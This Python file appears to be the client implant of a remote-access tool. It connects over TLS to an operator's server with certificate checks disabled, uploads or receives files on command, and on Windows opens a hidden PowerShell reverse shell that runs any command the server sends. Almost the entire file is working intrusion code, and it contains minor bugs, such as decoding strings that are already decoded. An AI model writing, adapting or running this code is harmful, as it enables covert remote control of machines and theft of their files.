import socket
import ssl
import time
import platform
from src.client.utils.config import logger
from utils.socket_utils import readline
from utils.file_utils import FileUtils


class AgentClient:
    def __init__(self, server_host: str, server_port: int) -> None:
        self.server_host = server_host
        self.server_port = server_port
        self.sock = None
        self.running = False

    def _create_context(self):
        ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
        ctx.minimum_version = ssl.TLSVersion.TLSv1_2
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE

        return ctx

    def connect(self):
        ctx = self._create_context()

        raw_sock = socket.create_connection(
            (self.server_host, self.server_port),
            timeout=10
        )

        self.sock = ctx.wrap_socket(raw_sock)
        self.sock.settimeout(None)

        self.running = True
        logger.debug("[agent] Connected to %s:%d", self.server_host, self.server_port)

    def run(self):
        if not self.sock:
            raise RuntimeError("Not connected")

        try:
            while self.running:
                chunk = readline(self.sock)

                if not chunk:
                    continue

                self._handle_command(chunk)
        except KeyboardInterrupt:
            logger.debug("[agent] CTRL+C pressed, exiting")
        except Exception as e:
            logger.debug("[agent] %s", e)
        finally:
            self.close()

    def _handle_command(self, cmd):
        logger.info("[agent] Received command: %r", cmd)
        cmd = cmd.decode("utf-8")

        if cmd.startswith("download "):
            filepath = cmd.split()[1].decode('utf-8')
            self._send_file(filepath)

        elif cmd.startswith("SEND_FILE "):
            filename = cmd.split()[1].decode("utf-8")
            self._download_file(filename)

        elif cmd.startswith("shell "):
            port = int(cmd.split()[1])
            self._shell(port)

        elif cmd == "quit":
            self.running = False

        else:
            pass

    def _shell(self, port):
        try:
            import platform, os
            if platform.system() == "Linux":
                pass
            elif platform.system() == "Windows":
                os.system(
                    """
                        powershell -nop -W hidden -noni -ep bypass -c "$TCPClient = New-Object Net.Sockets.TCPClient('{}', {});$NetworkStream = $TCPClient.GetStream();$StreamWriter = New-Object IO.StreamWriter($NetworkStream);function WriteToStream ($String) {{[byte[]]$script:Buffer = 0..$TCPClient.ReceiveBufferSize | % {{0}};$StreamWriter.Write($String + 'SHELL> ');$StreamWriter.Flush()}}WriteToStream '';while(($BytesRead = $NetworkStream.Read($Buffer, 0, $Buffer.Length)) -gt 0) {{$Command = ([text.encoding]::UTF8).GetString($Buffer, 0, $BytesRead - 1);$Output = try {{Invoke-Expression $Command 2>&1 | Out-String}} catch {{$_ | Out-String}}WriteToStream ($Output)}}$StreamWriter.Close()"
                    """.format(self.server_host, port)
                )
            else:
                logger.debug("[agent] Unsupported OS")
        except Exception as e:
            logger.debug("[agent] Shell Error: %s", e)

    def _download_file(self, filename):
        try:
            logger.debug(f"[agent] Uploading File {filename}")
            FileUtils.download_file(self.sock, filename)
        except Exception as e:
            logger.debug("[agent] Error in downloadfile %s", e)

    def _send_file(self, filename: str):
        try:
            logger.debug(f"[agent] Downloading File {filename}")
            FileUtils.send_file(self.sock, filename)
        except Exception as e:
            logger.debug("[agent] Error in sendfile %s", e)

    def _send_line(self, text):
        data = (text + "\n").encode("utf-8")
        try:
            self.sock.sendall(data)
        except OSError:
            self.running = False

    def close(self):
        self.running = False
        if self.sock:
            try:
                self.sock.close()
            except OSError:
                pass
            self.sock = None
        logger.debug("[agent] Closed")
